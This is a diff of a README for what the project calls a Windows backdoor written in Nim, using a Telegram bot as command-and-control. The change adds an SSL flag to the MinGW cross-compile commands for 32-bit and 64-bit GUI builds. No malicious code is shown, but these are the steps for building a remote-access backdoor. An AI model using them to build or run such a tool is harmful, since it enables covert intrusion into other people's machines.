@@ -12,9 +12,9 @@ a simple backdoor for Windows programmed in Nim that uses Telegram bot as a C2 s
 ```
 sudo apt install gcc-mingw-w64-x86-64 gcc-mingw-w64-i686
 
-nim c -d:mingw -d:release --app:gui --opt:size main.nim # 64-bit
+nim c -d:mingw -d:release -d:ssl --app:gui --opt:size main.nim # 64-bit
 
-nim c -d:mingw -d:release --cpu:i386 --app:gui --opt:size main.nim # 32-bit
+nim c -d:mingw -d:release -d:ssl --cpu:i386 --app:gui --opt:size main.nim # 32-bit
 
 ```
 
